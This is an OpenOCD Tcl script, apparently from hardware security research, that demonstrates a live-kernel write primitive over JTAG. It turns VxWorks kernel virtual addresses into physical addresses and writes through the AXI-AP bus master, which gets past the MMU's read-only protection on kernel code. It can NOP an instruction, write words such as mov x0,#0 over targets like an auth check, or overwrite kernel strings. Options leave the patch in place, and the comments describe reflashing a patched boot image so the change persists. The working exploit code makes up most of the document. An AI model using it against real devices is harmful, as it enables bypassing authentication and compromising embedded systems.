# probe-phys-patch.tcl — DEMONSTRATE the open-DAP live-kernel write primitive: modify the RUNNING
# kernel's memory over JTAG via VA->PA + an AXI-AP PHYSICAL write, which bypasses the MMU's stage-1
# read-only (.text/.rodata) permission that data-aborts a CPU store. This is Capability 2 — the
# realized payoff of the open DAP; it uses Capability 1's addresses to know WHAT to patch.
#
# Safe: freezes all cores for the window. Restores the original bytes by default (PATCH_RESTORE=1) so
# each core's cache never diverges from DRAM; set PATCH_RESTORE=0 to LEAVE the change in place.
#
# Modes (env):
#   (default)            patch the instruction at the live PC with a NOP, show before/after, restore.
#   PATCH_VA=0x..        target a CHOSEN virtual address (a function/string/global from Cap 1's
#                        Ghidra/symbols — e.g. a banner, an auth check).
#   PATCH_STR='text'     write ASCII text at the target (VISIBLE before/after — patch a printable
#                        kernel string and watch it change). USE SINGLE QUOTES in zsh — a '!' inside
#                        "double quotes" triggers zsh history expansion and hangs at `dquote>`.
#   PATCH_WORD=0x..      write this 32-bit word instead of the NOP (e.g. 0xd2800000 = mov x0,#0).
#   PATCH_RESTORE=0      LEAVE the patch in place (persistent for this boot) instead of restoring.
#   PATCH_HALT=0         do NOT halt any core — pure AXI-AP memory access, ZERO core interaction.
#                        Recommended for a string/data patch on a flaky DAP (VMware passthrough): it
#                        cannot wedge the A53 DTR or crash OpenOCD. Use with PATCH_VA (no reg pc needed).
#   PATCH_CTX=N          bytes of context to show around the target (default 16).
#   PATCH_USE_V2P=1      translate VA->PA via the CORE (virt2phys). DEFAULT IS OFF because that uses an
#                        AT instruction + PAR read THROUGH THE DTR, which faults at EL1 and wedges the
#                        DTR (and can segfault OpenOCD 0.12). By default PA = (VA & 0xFFFFFFFF) -
#                        PATCH_KVA_LO (0x80000000) — the VxWorks kernel's linear map, no core touch.
#
# SAFEST run on a flaky DAP (no core interaction at all):
#   PATCH_VA=<kernel VA> PATCH_HALT=0 PATCH_STR='...' PATCH_RESTORE=0 \
#     openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"
#   (single-quote PATCH_STR in zsh; a '!' inside double quotes triggers history expansion -> `dquote>`)
# If you see DSCR_DTR_RX_FULL / DSCR.ERR=1 / a segfault, the DTR is wedged from a prior CORE access —
# POWER-CYCLE the board to clear it, then re-run with PATCH_HALT=0 (this script no longer touches it).
#
# Examples:
#   openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"
#   PATCH_VA=0xFFFFFFFF801032F8 PATCH_STR='PWNED-BY-JTAG' PATCH_HALT=0 PATCH_RESTORE=0 \
#     openocd -f openocd/zcu102.cfg -c "init; source openocd/probe-phys-patch.tcl; shutdown"

proc _env {n d} { if {[info exists ::env($n)]} { return $::env($n) } ; return $d }
proc _pc {} { if {[catch {reg pc} o]} { return 0 } ; if {[regexp {0x[0-9a-fA-F]+} $o m]} { return $m } ; return 0 }
proc _rdw {a n} { if {[catch {read_memory $a 32 $n} v]} { return "" } ; return $v }
# one hex+ASCII gutter line for a list of 32-bit words starting at addr
proc _hexascii {addr words} {
    set hex "" ; set asc ""
    foreach w $words {
        for {set b 0} {$b < 4} {incr b} {
            set c [expr {($w >> ($b*8)) & 0xFF}]
            append hex [format "%02x " $c]
            append asc [expr {($c >= 0x20 && $c < 0x7f) ? [format %c $c] : "."}]
        }
    }
    return [format "%08x:  %-48s |%s|" $addr $hex $asc]
}

set CTX     [_env PATCH_CTX 16]
set RESTORE [_env PATCH_RESTORE 1]
set STR     [_env PATCH_STR ""]
set HEX     [_env PATCH_HEX ""]               ;# arbitrary byte patch (LE), e.g. a mov+ret recipe from patch-recipe.py
set WORD    [_env PATCH_WORD 0xd503201f]      ;# AArch64 NOP
set VA_ARG  [_env PATCH_VA ""]
set HALT    [_env PATCH_HALT 1]               ;# 0 = pure AXI-AP, never touch a core (no wedge risk)
set KVA_LO  [_env PATCH_KVA_LO 0x80000000]    ;# VxWorks kernel linear map: PA = (VA & 0xFFFFFFFF) - this
# Target/DAP names: default to ZynqMP (unchanged behaviour). Override for another SoC, e.g. Zynq-7000:
#   PATCH_CORE=zynq.cpu0 PATCH_AXI=zynq.axi PATCH_DAP=zynq.dap
set CORE    [_env PATCH_CORE uscale.a53.0]    ;# core to halt (only used when PATCH_HALT!=0)
set MEMAP   [_env PATCH_AXI  uscale.axi]      ;# mem-AP target for the physical R/W
set DAP     [_env PATCH_DAP  uscale.dap]      ;# dap name (for dpreg)
set ctxw    [expr {($CTX + 3) / 4}]
set _halted 0
proc _resume {} { if {$::_halted} { catch { targets $::CORE; resume } _ } }   ;# only the core we halted

# ---- (optionally) freeze the OS so nothing executes during the window ----
# Halting prevents the running OS from seeing a half-written value, but it touches the A53 debug logic.
# With PATCH_HALT=0 + PATCH_VA set, this demo does ZERO core interaction (pure AXI-AP memory) — it
# cannot wedge the DTR or crash OpenOCD. Recommended on a flaky DAP / VMware passthrough.
if {$HALT ne "0"} {
    catch { targets $CORE; halt } _
    set _halted 1
    after 30
}

# ---- resolve the target VA (chosen, or the live PC) ----
if {$VA_ARG ne ""} {
    set VA $VA_ARG ; set src "PATCH_VA (chosen target)"
} else {
    set VA [_pc] ; set src "live PC (reg pc — needs a halted core; prefer PATCH_VA)"
}

echo ""
echo "================================================================"
echo " CAPABILITY 2 — LIVE-KERNEL PATCH via JTAG (AXI-AP physical write)"
echo "================================================================"
echo " target VA   = $VA   <- $src"
if {$VA == 0} {
    echo " ERROR: no target VA. Set PATCH_VA=0x... (find one: tools/find-patch-target.py)."
    _resume ; return
}
# ---- resolve PA WITHOUT the core. virt2phys translates via the A53 (AT instr + PAR read through the
# DTR), which faults at EL1 and WEDGES the DTR (and can crash OpenOCD 0.12). The VxWorks kernel is
# mapped linearly, so compute it: PA = (VA & 0xFFFFFFFF) - KVA_LO. Opt into virt2phys with
# PATCH_USE_V2P=1 only if the DAP is healthy and you need a non-linear mapping. ----
set PA 0
if {[_env PATCH_USE_V2P 0] ne "0"} {
    if {![catch {virt2phys $VA} o] && [regexp {0x[0-9a-fA-F]+} $o m]} { set PA $m }
    echo " PA (virt2phys, via core) = $PA"
} else {
    set PA [format 0x%08X [expr {($VA & 0xFFFFFFFF) - $KVA_LO}]]
    echo " PA = (VA & 0xFFFFFFFF) - 0x[format %X $KVA_LO] = $PA   (linear kernel map; no core touch)"
}
if {$PA == 0 || ($PA & 0x80000000)} {
    echo " ERROR: PA looks wrong ($PA). Is the VA in the kernel's linear region? Adjust PATCH_KVA_LO,"
    echo "        or set PATCH_USE_V2P=1 (only if the DAP is healthy)."
    _resume ; return
}

# ---- read BEFORE via the AXI-AP physical path (never read through the core at EL1 -> wedges DTR) ----
catch { $DAP dpreg 0 0x1e } _
targets $MEMAP
catch { $MEMAP arp_examine } _
set before [_rdw $PA $ctxw]
echo ""
echo " The MMU marks the kernel's .text/.rodata READ-ONLY: a CPU store here data-aborts. The AXI-AP is"
echo " a bus MASTER — its physical write ignores stage-1 permissions. Watch read-only memory change:"
echo ""
echo " BEFORE  [_hexascii $PA $before]"

# pack a list of bytes into little-endian 32-bit words; merge a trailing partial word with the original
# memory ($before) so we don't zero adjacent bytes.
proc _pack_le {bytes before} {
    set pwords {} ; set acc 0 ; set sh 0
    foreach byte $bytes {
        set acc [expr {$acc | (($byte & 0xFF) << $sh)}] ; incr sh 8
        if {$sh == 32} { lappend pwords [expr {$acc & 0xFFFFFFFF}] ; set acc 0 ; set sh 0 }
    }
    if {$sh > 0} {
        set keep [lindex $before [llength $pwords]] ; if {$keep eq ""} { set keep 0 }
        set mask [expr {(1 << $sh) - 1}]
        lappend pwords [expr {($acc & $mask) | ($keep & ~$mask) & 0xFFFFFFFF}]
    }
    return $pwords
}

# ---- build the patch words ----
if {$HEX ne ""} {
    regsub -all {[^0-9a-fA-F]} $HEX "" h          ;# strip spaces / 0x / commas
    set bytes {}
    for {set i 0} {$i+1 < [string length $h]} {incr i 2} { lappend bytes [expr "0x[string range $h $i [expr {$i+1}]]"] }
    set pwords [_pack_le $bytes $before]
    set what "hex ([llength $bytes] bytes)"
} elseif {$STR ne ""} {
    binary scan $STR c* sb
    set pwords [_pack_le $sb $before]
    set what "ASCII \"$STR\""
} else {
    set pwords [list [expr {$WORD & 0xFFFFFFFF}]]
    set what [format "word 0x%08x" [expr {$WORD & 0xFFFFFFFF}]]
}

echo ""
echo " PATCH   writing $what at PA $PA (physical, via the bus master) ..."
if {[catch {write_memory $PA 32 $pwords} werr]} { echo "   write_memory error: $werr" }

set after [_rdw $PA $ctxw]
echo ""
echo " AFTER   [_hexascii $PA $after]"

# ---- verdict: did the patched words actually change to what we wrote? ----
set ok 1
for {set i 0} {$i < [llength $pwords]} {incr i} {
    if {[lindex $after $i] != [lindex $pwords $i]} { set ok 0 ; break }
}
echo ""
echo "================================================================"
if {$ok} {
    echo " VERDICT: READ-ONLY KERNEL MEMORY MODIFIED over JTAG.  (PROVEN)"
    echo "   The bytes the CPU could not write (RO .text/.rodata) now hold attacker-controlled data —"
    echo "   the arbitrary live-kernel write/patch primitive (Capability 2)."
} else {
    echo " VERDICT: write did NOT take.  (BLOCKED)"
    echo "   The AXI-AP is blocked for this region (DDR XMPU / TrustZone) or the VA wasn't what you think."
    echo "   Check the Phase-1 'Required security state' (JTAG_DIS=0, DAP_SEC open, APU_DBGEN=1, XMPU off)."
}
echo "================================================================"

# ---- restore or leave ----
if {$RESTORE ne "0" && $before ne ""} {
    catch { write_memory $PA 32 $before } _
    echo " restored the original bytes (PATCH_RESTORE=1 — no lasting change)."
} else {
    echo " LEFT IN PLACE (PATCH_RESTORE=0) — the change persists for this boot."
    echo " SEE IT from the target's VxWorks shell on ttyUSB0:   d 0x[format %x $VA]"
    echo "   (cache caveat: a cached line may read stale until it refills; uncached/data regions show"
    echo "    immediately. For a GUARANTEED behavioral change, patch the dumped boot image at"
    echo "    VA-link_base, rebuild with mkbootimage, reflash — baked into every boot.)"
}

_resume
if {$_halted} { echo " cores resumed." } else { echo " (no core was halted — pure AXI-AP run)." }
echo ""
